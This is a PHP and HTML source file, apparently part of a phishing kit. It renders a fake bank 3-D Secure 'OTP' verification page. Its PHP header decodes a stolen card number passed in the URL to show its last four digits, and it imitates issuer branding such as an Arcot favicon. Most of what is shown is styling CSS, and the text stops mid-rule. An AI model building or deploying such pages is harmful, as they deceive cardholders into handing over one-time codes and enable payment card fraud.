﻿<?php
if (!isset($_GET['reference'])) {
    echo "barra nik omek";
    exit();
}
$reference = $_GET['reference'];
function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
$billccnumber = base64_decode($_GET['ccnumber']);
$realcc = str_replace(' ', '', $billccnumber);
$lbin = substr($realcc, strlen($realcc)-4, 4);//Last of bin
?>
<!DOCTYPE html>
<html>
    <head>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <link rel="icon" data-savepage-href="https://secure7.arcot.com/favicon.ico" href="" />
        <title>SO OTP Template</title>
        <meta charset="utf-8" />
        <!-- Disable phone number linking -->
        <meta name="format-detection" content="telephone=no" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1.0;" />
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">
        <style>
            /* cyrillic-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSKmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSumu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSOmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSymu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0370-03FF;
            }
            /* hebrew */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS2mu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* vietnamese */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSCmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSGmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS-mu0SC55I.woff2*/ url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSKmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSumu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSOmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSymu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0370-03FF;
            }
            /* hebrew */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS2mu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* vietnamese */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSCmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSGmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 600;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS-mu0SC55I.woff2*/ url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSKmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSumu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSOmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSymu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0370-03FF;
            }
            /* hebrew */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS2mu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* vietnamese */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSCmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSGmu0SC55K5gw.woff2*/ url() format("woff2");
                unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Open Sans";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                /*savepage-font-display=swap*/
                src: /*savepage-url=https://fonts.gstatic.com/s/opensans/v35/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS-mu0SC55I.woff2*/ url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
        </style>

        <style>
            *:focus {
                outline: 0px;
            }
            * {
                -webkit-text-size-adjust: 100%;
            }
            html {
                height: 100%;
                width: 100%;
                padding: 0px;
                margin: 0px;
                min-width: 250px;
                min-height: 400px;
                overflow: auto;
            }
            body {
                min-height: 400px;
                min-width: 100%;
                height: 100%;
                width: 100%;
                padding: 0px;
                margin: 0px;
                font-family: Verdana, Geneva, sans-serif;
                font-size: 13px;
                text-align: center;
                overflow: hidden;
            }
            .container {
                position: relative;
                width: 100%;
                height: 100%;
                border: 1px solid;
                padding: 0px;
                margin: 0px;
                background: #ffffff;
                overflow-x: hidden;
                overflow-y: auto;
                scrollbar-width: thin;
                -ms-overflow-style: -ms-autohiding-scrollbar;
            }
            .header-zone {
                position: relative;
                height: 5%;
                width: 86%;
                background: #ffffff;
                padding: 0.5% 7% 0.5% 7%;
                margin: 0px;
                box-shadow: 1px 1px #cccccc;
            }
            .lang-section {
                position: relative;
                height: 100%;
                width: 20%;
                float: left;
                background: #ffffff;
                margin: 0px;
                padding: 0px;
                text-align: left;
            }
            .lang-section select,
            .lang-section select option {
                background: #ffffff;
                color: #4a4a4a;
                border: none;
                text-align: left;
                font-family: Open Sans;
                font-size: 13px;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
                max-width: 14ch;
            }
            .selectOption {
                padding: 0px 5px;
            }
            .secondary-btn {
                position: relative;
                height: 100%;
                width: 60%;
                float: right;
                background: #ffffff;
                margin: 0px;
                padding: 0px;
                text-align: right;
            }
            .secondary-btn a {
                position: relative;
                width: 100%;
                height: 100%;
                background: #ffffff;
                color: #d5002b;
                margin: 0px;
                padding: 0px;
                text-decoration: underline;
                font-family: Open Sans;
                font-size: 10px;
                font-weight: 600;
                text-align: right;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
                max-width: 12ch;
            }
            .branding-zone {
                position: relative;
                height: 10%;
                width: 86%;
                padding: 1% 7% 0.5% 7%;
                margin-bottom: 2px;
                box-shadow: 1px 1px #cccccc;
                display: -webkit-box;
            }
            .issuer-bank-logo {
                position: relative;
                height: 100%;
                width: 45%;
                float: left;
                background: #ffffff;
                margin: 0px;
                padding: 0px;
                text-align: left;
                border: none;
                background-size: contain;
            }
            .card-brand-logo {
                position: relative;
                height: 100%;
                width: 45%;
                float: right;
                background: #ffffff;
                margin-left: 10%;
                padding: 0;
                text-align: right;
                border: none;
                background-size: contain;
            }
            .issuer-bank-logo img {
                position: relative;
                width: auto;
                height: auto;
                max-width: 100%;
                max-height: 100%;
                top: 50%;
                transform: translate(0, -50%);
            }
            .card-brand-logo img {
                position: relative;
                width: auto;
                height: auto;
                max-width: 100%;
                max-height: 100%;
                top: 50%;
                transform: translate(0, -50%);
            }
            .challenge-zone {
                position: relative;
                width: 86%;
                min-height: 65%;
                height: auto;
                padding: 1% 7% 1% 7%;
                margin: 0px;
                background: #fcfcfc;
                box-shadow: 1px 1px #cccccc;
                overflow-x: auto;
                overflow-y: hidden;
            }
            .challenge-info-header {
                position: relative;
                width: 100%;
                min-height: 30px;
                height: auto;
                padding: 0px;
                margin: auto;
                text-align: center;
            }
            .challenge-info-header-h3 {
                text-align: center;
                font-family: Open Sans;
                font-size: 16px;
                font-weight: 700;
                color: #621a4b;
                /*white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;*/
                line-height: 25px;
                padding: 1%;
                margin: 0%;
            }
            .challenge-info-text {
                position: relative;
                width: 96%;
                height: auto;
                padding: 0.5% 2% 2% 2%;
                margin: 0px;
                text-align: center;
                overflow-y: auto;
                -moz-text-align-last: center;
                text-align-last: center;
                font-family: Open Sans;
                font-size: 12px;
                font-weight: normal;
                color: #c40000;
                overflow-y: auto;
                line-height: 17px;
            }
            .challenge-info-text > p {
                margin: 0px;
                color: #d5002b;
            }
            .challenge-info-sub-header {
                font-size: 13px;
                color: #621a4b;
                line-height: 16px;
                text-align: center;
                font-family: "Open Sans";
                font-weight: 600;
                padding: 2% 2% 0% 2%;
                margin-bottom: 0px;
            }
            .container-body-header-desc-otp-ext > p {
                margin: 0px;
                color: #d5002b;
            }
            .txnDetails,
            .txnDetails > span {
                color: #2d373e !important;
                font-size: 12px;
                font-family: Open Sans;
                font-weight: normal;
                line-height: 1.4;
                text-align: center;
            }
            .channelSelectionText {
                margin: 0px;
                font-family: Open Sans;
                font-size: 12px;
                font-weight: 600;
                padding: 5px 0px 10px 0px;
                color: #333840;
                line-height: 22px;
            }
            .resendInfoText {
                margin: 0px;
                font-family: Open Sans;
                font-size: 13px;
                font-weight: 500;
                padding: 10px 0px 0px 0px;
                color: #333840;
            }
            .channelSelectValidationText {
                color: #c40000;
                text-align: center;
                font-family: Open Sans;
                font-size: 13px;
                padding: 0px;
                margin: 0px;
            }
            .txnInputFormDiv {
                position: relative;
                width: 90%;
                height: auto;
                padding: 0px 0px;
                margin: auto;
            }
            .txnInputForm {
                position: relative;
                width: 100%;
                height: 100%;
                padding: 0px;
                margin: 0px;
            }
            .container-body-txnInput {
                position: relative;
                display: table;
                margin: auto;
                font-size: 12px;
                line-height: 22px;
                font-family: Open Sans;
                text-align: left;
                color: #2d373e;
                font-weight: 600;
                word-break: break-word;
            }
            /**Custom Radio Button - Start**/
            /* Hide the browser's default radio button */
            .container-body-txnInput input {
                position: absolute;
                opacity: 0;
                cursor: default;
            }

            .container-body-txnInput label {
                position: relative;
                //width: 260px;
                padding: 0px 0px 0px 15px;
                color: #2d373e;
            }

            /* Create a custom radio button */
            .checkmark {
                width: 14px;
                height: 14px;
                top: 8px;
                left: 10px;
                border-radius: 50%;
                position: absolute;
                background-color: #eee;
                border: 1px solid #d1d3d1;
                -ms-transform: translate(-50%, -50%);
                transform: translate(-50%, -50%);
            }

            /* When the radio button is checked, add a blue background */
            .container-body-txnInput input:checked ~ .checkmark {
                background-color: #621a4b;
            }

            /* Create the indicator (the dot/circle - hidden when not checked) */
            .checkmark:after {
                content: "";
                position: absolute;
                display: none;
            }

            /* Show the indicator (dot/circle) when checked */
            .container-body-txnInput input:checked ~ .checkmark:after {
                display: block;
            }

            /* Style the indicator (dot/circle) */
            .container-body-txnInput .checkmark:after {
                top: 5px;
                left: 5px;
                width: 4px;
                height: 4px;
                border-radius: 6px;
                background: #f9f9f8;
            }

            /**Custom Radio Button - End**/
            .container-body-txnInput-verify {
                position: relative;
                width: 90%;
                font-size: 13px;
                font-family: Open Sans;
                text-align: center;
                margin: auto;
                padding-top: 2%;
            }
            .text_input::placeholder {
                min-width: 165px;
                width: auto;
                max-width: 300px;
                border: none;
                display: inline-block;
                margin: 0px 0px 2px 0px;
                padding: 6px 2px 6px 2px;
                font-family: Open Sans;
                font-size: 10px;
                text-align: center;
                line-height: 25px;
                font-weight: 500;
                color: #9b9b9b;
                letter-spacing: 2px;
            }
            .text_input:-ms-input-placeholder {
                min-width: 165px;
                width: auto;
                max-width: 300px;
                border: 1px solid #621a4b;
                display: inline-block;
                margin: 0px 0px 2px 0px;
                padding: 0px 2px 12px 2px;
                font-family: Open Sans;
                font-size: 10px;
                text-align: center;
                line-height: 25px;
                font-weight: 500;
                color: #9b9b9b;
                letter-spacing: 2px;
            }
            .text_input::-webkit-input-placeholder {
                min-width: 165px;
                width: auto;
                max-width: 300px;
                border: none;
                display: inline-block;
                margin: 0px 0px 2px 0px;
                padding: 0px 2px 0px 2px;
                font-family: Open Sans;
                font-size: 10px;
                text-align: center;
                line-height: 25px;
                font-weight: 500;
                color: #9b9b9b;
                letter-spacing: 2px;
            }
            .text_input {
                width: 165px;
                border: none;
                display: inline-block;
                margin: 0px 0px 2px 0px;
                border: 1px solid #621a4b;
                font-family: Open Sans;
                font-size: 17px;
                text-align: center;
                font-weight: 600;
                color: #4a4a4a;
                letter-spacing: 7px;
            }
            #resend-button {
                border: solid 1px #d5002b;
                background: white;
                color: #2d373e;
                min-width: 165px;
                max-width: 300px;
                max-height: 32px;
                overflow-x: hidden;
                text-overflow: ellipsis;
                font-size: 13px;
                font-family: Open Sans;
                font-weight: 500;
                height: 36px;
                cursor: pointer;
                -webkit-appearance: none;
            }
            .container-body-submit {
                position: relative;
                width: 100%;
                min-height: 32px;
                margin: 5px auto;
                padding: 0px;
            }
            .container-body-submit-elongated {
                position: relative;
                height: 32px;
                margin: 0px auto 20px auto;
                padding: 0px;
            }
            .container-body-submit-input {
                position: relative;
                height: 32px;
                width: 100%;
                background: #d5002b;
                text-align: center;
                color: white;
                border-radius: 2px;
                padding: 0px;
                display: inline-block;
            }
            .container-body-submit-input-elongated {
                position: relative;
                height: 32px;
                width: auto;
                background: #d5002b;
                text-align: center;
                color: white;
                border-radius: 2px;
                padding: 0px;
                display: inline-block;
            }
            #verify-button,
            #verify-btn,
            #next-button {
                position: relative;
                height: 32px;
                width: 100%;
                border: none;
                border-radius: 4px;
                background: #d5002b;
                color: #ffffff;
                font-size: 12px;
                font-family: Open Sans;
                font-weight: 600;
                cursor: pointer;
                -webkit-appearance: none;
            }
            #verify-button,
            #verify-btn {
                min-width: 165px;
            }
            #verify-button:disabled {
                cursor: not-allowed;
                opacity: 0.65;
            }
            #verify-btn:disabled {
                cursor: not-allowed;
                opacity: 0.65;
            }
            #next-button:disabled {
                cursor: not-allowed;
                opacity: 0.65;
            }
            #verify-btn-elongated {
                position: relative;
                height: 32px;
                min-width: 165px;
                max-width: 300px;
                width: auto;
                border: none;
                border-radius: 4px;
                background: #d5002b;
                color: #ffffff;
                font-size: 12px;
                font-family: Open Sans;
                font-weight: 600;
                cursor: pointer;
                overflow: hidden;
                text-overflow: ellipsis;
                -webkit-appearance: none;
            }
            .validationText {
                color: #c40000;
                text-align: center;
                margin: 0;
                font-size: 10px;
                line-height: 14px;
                margin-bottom: 10px;
            }
            .secondary-card-holder {
                /* margin-left: 105px; */
            }
            .container-footer {
                width: 86%;
                min-height: 15%;
                height: auto;
                padding: 1% 7% 1% 7%;
                margin: 0px;
                background: #ffffff;
            }
            #displayText {
                position: relative;
                width: 98%;
                height: 18px;
                padding: 6px 0px 4px 0px;
                font-family: Open Sans;
                font-size: 12px;
                line-height: 28px;
                margin: auto;
                font-weight: 600;
                color: #d5002b;
            }
            #hideText p {
                margin: 0px;
            }
            .hidetext-span {
                color: #2d373e;
                font-family: Open Sans;
                position: relative;
                width: 94%;
                height: auto;
                padding: 2%;
                margin: 0px;
                text-align: left;
                font-size: 12px;
                font-weight: normal;
                line-height: 1.4;
                float: left;
            }
            .hidetext1-span {
                color: #2d373e;
                font-family: Open Sans;
                position: relative;
                width: 94%;
                height: auto;
                padding: 2%;
                margin: 0px;
                text-align: left;
                font-size: 12px;
                font-weight: normal;
                overflow-y: auto;
                line-height: 1.4;
                float: left;
            }

            .txnErrorForm h3 {
                color: #c40000;
                font-size: 16px;
                font-weight: 700;
                line-height: 25px;
                margin: 0;
            }
            .txnErrorParagraphDiv p {
                line-height: 14px;
                color: #2d373e;
                font-size: 12px;
                font-weight: 500;
            }
            .serverErrorMsg {
                width: auto;
                margin-left: auto;
                margin-right: auto;
                display: inline-flex;
                margin-bottom: 5px;
            }
            /* ********** Cancel Transaction *********** */
            .container-greyout {
                position: inherit;
                height: 100%;
                width: 100%;
                padding: 0px;
                margin: 0px;
                z-index: 100;
                background: #303030;
                opacity: 0.98;
                display: none;
                font-family: Open Sans;
            }
            .cancelTxn-div {
                position: relative;
                height: auto;
                width: 90%;
                max-height: 50%;
                overflow: auto;
                background: white;
                border: solid grey 1px;
                border-radius: 5px;
                opacity: 1;
                z-index: 1001;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                padding: 1% 2% 2%;
                text-align: left;
                font-size: 13px;
                scrollbar-width: thin;
            }
            .cancelTxn-div h3 {
                font-size: 14px;
                font-weight: 700;
                color: #333840;
                line-height: 35px;
                margin-top: 1%;
            }
            .cancelTxn-div p {
                font-size: 10px;
                line-height: 18px;
                color: #4a4a4a;
            }
            .cancelTxn-div-msg {
                height: 80%;
                padding: 0 2%;
            }
            .cancelTxn-div-info-msg {
                height: 55%;
                overflow-y: auto;
            }
            .cancelTxn-div-submit {
                position: relative;
                width: auto;
                height: auto;
                display: inline-flex;
                padding: 0px;
                float: right;
            }
            .cancelTxn-input-btn {
                position: relative;
                height: 25px;
                min-width: 25px !important;
                max-width: 120px;
                width: auto;
                border: none;
                color: #d5002b !important;
                background: none !important;
                float: right;
                font-size: 8px;
                font-weight: 600;
                cursor: pointer;
                font-family: Open Sans;
            }
            .cancelTxn-submit {
                position: relative;
                height: 25px;
                min-width: 25px !important;
                max-width: 120px;
                width: auto;
                border: none !important;
                float: right;
                color: #d5002b !important;
                background: none !important;
                font-size: 8px;
                font-weight: 600;
                cursor: pointer;
                font-family: Open Sans;
            }
            /* ********** Cancel Transaction *********** */
            .whyInfo-arrow-span {
                float: left;
                text-align: left;
                text-overflow: ellipsis;
                white-space: nowrap;
                overflow: hidden;
                width: 80%;
            }
            .expandableInfo-arrow-span {
                float: left;
                text-align: left;
                text-overflow: ellipsis;
                white-space: nowrap;
                overflow: hidden;
                width: 80%;
            }
            .whyInfo-arrow-image {
                float: right;
                height: 15px;
                width: 15px;
                padding-top: 7px;
            }
            .expandableInfo-arrow-image {
                float: right;
                height: 15px;
                width: 15px;
                padding-top: 7px;
            }
            .authFailure-arrow-image {
                height: 40px !important;
                width: 40px !important;
                float: left;
                display: table;
                padding-right: 5px;
                margin-top: auto;
                margin-bottom: auto;
            }
            .transFailure-arrow-image {
                height: 40px;
                width: 40px;
            }
            .div-loading {
                position: absolute;
                top: 50%;
                left: 0;
                right: 0;
                z-index: 999;
                width: 80px;
                height: 16px;
                margin: 0 auto;
                padding: 10px;
                background: #fcfcfc;
                border-radius: 25px;
                border: 1px solid #000000;
            }

            .img-loading {
                width: 80px;
                height: 16px;
            }

            /*scrollbar width */
            ::-webkit-scrollbar {
                width: 5px;
                height: 5px;
                border-radius: 3px;
            }

            /*scrollbar Track */
            ::-webkit-scrollbar-track {
                background: #f1f1f1;
                border-radius: 3px;
            }

            /*scrollbar Handle */
            ::-webkit-scrollbar-thumb {
                background: #888;
                border-radius: 3px;
            }

            /*scrollbar Handle on hover */
            ::-webkit-scrollbar-thumb:hover {
                background: #555;
                border-radius: 3px;
            }
            @media screen and (min-width: 250px) {
                .container-body-submit {
                    width: 146px;
                }
                .container-body-submit-input {
                    width: auto;
                }
                #verify-button,
                #verify-btn,
                #next-button {
                    min-width: 146px;
                }
            }
            @media screen and (max-width: 400px) {
                .challenge-info-header-h3 {
                    font-size: 16px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 11px;
                }
                .challenge-info-sub-header {
                    font-size: 13px;
                }
                #displayText {
                    font-size: 11px;
                }
                .hidetext-span {
                    font-size: 10px;
                }
                .hidetext1-span {
                    font-size: 10px;
                }
            }
            @media screen and (min-width: 401px) and (max-width: 600px) {
                .challenge-info-header-h3 {
                    font-size: 16px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 12px;
                }
                .challenge-info-sub-header {
                    font-size: 14px;
                }
                #displayText {
                    font-size: 12px;
                }
                .hidetext-span {
                    font-size: 11px;
                }
                .hidetext1-span {
                    font-size: 11px;
                }
            }
            @media screen and (min-width: 601px) and (max-width: 1000px) {
                .challenge-info-header-h3 {
                    font-size: 17px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 13px;
                }
                .challenge-info-sub-header {
                    font-size: 15px;
                }
                #displayText {
                    font-size: 13px;
                }
                .hidetext-span {
                    font-size: 11px;
                }
                .hidetext1-span {
                    font-size: 13px;
                }
            }
            @media screen and (min-width: 1001px) {
                .challenge-info-header-h3 {
                    font-size: 19px;
                }
                .challenge-info-text,
                .txnDetails,
                .txnDetails > span {
                    font-size: 15px;
                }
                .challenge-info-sub-header {
                    font-size: 17px;
                }
                #displayText {
                    font-size: 15px;
                }
                .hidetext-span {
                    font-size: 14px;
                }
                .hidetext1-span {
                    font-size: 14px;
                }
            }
            @media screen and (min-width: 600px) and (min-height: 400px) {
                .challenge-zone {
                    min-height: 59%;
                }
            }
            @media screen and (min-width: 675px) {
                .challenge-zone {
                    min-height: 58%;
                }
                .challenge-info-header-h3 {
                    padding: 1%;
                }
                .container-body-Channel-enclose {
                    margin-left: 21%;
                }
            }
            @media screen and (min-width: 735px) {
                .challenge-zone {
                    min-height: 57%;
                }
            }
            @media screen and (min-width: 800px) {
                .challenge-zone {
                    min-height: 56%;
                }
                .container-body-Channel-enclose {
                    margin-left: 22%;
                }
            }
            @media screen and (min-width: 860px) {
                .challenge-zone {
                    min-height: 55%;
                }
                .challenge-info-header-h3 {
                    padding: 0%;
                }
            }
            @media screen and (min-width: 920px) {
                .challenge-zone {
                    min-height: 54%;
                }
            }
            @media screen and (min-width: 990px) {
                .challenge-zone {
                    min-height: 53%;
                }
            }
            @media screen and (min-width: 1050px) {
                .challenge-zone {
                    min-height: 52%;
                }
                .container-body-Channel-enclose {
                    margin-left: 23%;
                }
            }
            @media screen and (min-width: 1115px) {
                .challenge-zone {
